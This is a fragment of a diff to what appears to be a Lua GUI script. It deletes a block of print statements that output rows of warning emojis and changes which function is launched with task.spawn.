-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	
-end;
-task.spawn(C_c1);
+task.spawn(C_b3);
 
 return G2L["1"], require;
